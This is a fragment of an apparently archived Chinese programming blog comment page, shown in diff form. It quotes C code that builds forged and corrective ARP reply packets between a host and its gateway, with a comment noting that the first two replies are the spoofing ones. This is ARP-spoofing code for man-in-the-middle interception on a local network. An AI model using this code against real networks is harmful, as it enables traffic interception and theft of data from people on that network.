+<br>    {
+<br>        eth.eh_dst[k]=spip-&gt;mac[k];
+<br>        eth.eh_src[k]=gateip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=gateip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=spip-&gt;mac[k];
+<br>    }
+<br>	<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_spa=gateip-&gt;ip;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tpa=spip-&gt;ip;
+<br>
+<br>	memset(rsendbuftosp,0,sizeof(rsendbuftosp));
+<br>    memcpy(rsendbuftosp,&amp;eth,sizeof(eth));
+<br>    memcpy(rsendbuftosp+sizeof(eth),&amp;<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>,sizeof(<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>));
+<br>
+<br>	for(k=0;k&lt;6;k++)
+<br>    {
+<br>        eth.eh_dst[k]=gateip-&gt;mac[k];
+<br>        eth.eh_src[k]=spip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_sha[k]=spip-&gt;mac[k];
+<br>        <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tha[k]=gateip-&gt;mac[k];
+<br>    }
+<br>	<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_spa=spip-&gt;ip;
+<br>    <b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_tpa=gateip-&gt;ip;
+<br>
+<br>	memset(rsendbuftogate,0,sizeof(rsendbuftogate));
+<br>    memcpy(rsendbuftogate,&amp;eth,sizeof(eth));
+<br>    memcpy(rsendbuftogate+sizeof(eth),&amp;<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>,sizeof(<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>));
+<br>前两个<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>应答是欺骗，后面两个<b style="color: black; background-color: rgb(255, 255, 102);">ARP</b>应答是正确的那既不是多余，如果是这样的话，那删掉好了&nbsp;&nbsp;<a onclick='return SetReplyAuhor("梦郎")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e6%a2%a6%e9%83%8e" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl85_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl85$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl85_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+</div></div></td></tr></tbody></table></form></div></body>
+</html>
